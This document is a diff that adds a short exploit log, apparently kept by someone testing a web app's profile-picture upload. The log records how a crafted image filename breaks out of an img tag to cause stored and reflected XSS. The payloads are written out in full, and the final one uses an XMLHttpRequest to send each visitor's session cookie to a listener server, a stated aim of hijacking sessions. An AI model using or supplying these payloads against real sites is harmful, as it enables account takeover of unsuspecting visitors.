@@ -1,0 +1,27 @@
+When editing the PFP, image tag is vulnerable to XSS:
+
+/"onerror="alert(1)".png
+
+/" will set the "src" attr to "/" and the " will close it, leaving it with an empty source that will fire the onerror event. 
+".png" will end up being just an empty property on the img tag, as seen:
+
+<img src="/" onerror="alert(1)" .png"="" ">
+
+Plus, as the server will return this image on every profile request, the alert will be exectuted every time this profile is visited,
+turning the vulnerability into a Stored XSS. Still looking for a way to load a remote script when image loading fails, sending the session 
+cookies of the visitor to a remote server every time it visits the infected profile.
+
+Found a Reflected XSS vuln in the same input. When loading an image with the same payload, but closing the initial img tag, the XSS is executed:
+
+/"onerror="console.log(document.cookie)"><script>alert(1)</script>".png
+
+This just breakes the whole img tag and serves a new script in the page, which, again, will be stored. Will this work to serve the malicious script?
+
+IT DID.
+
+/"onerror="console.log(document.cookie)"><script>var a = new XMLHttpRequest({mozSystem: true});
+a.open('GET', 'http://127.0.0.1:8082/incoming' + '?sessionId=' + document.cookie.replace('session=', ''), true);
+a.send();
+</script>".png
+
+
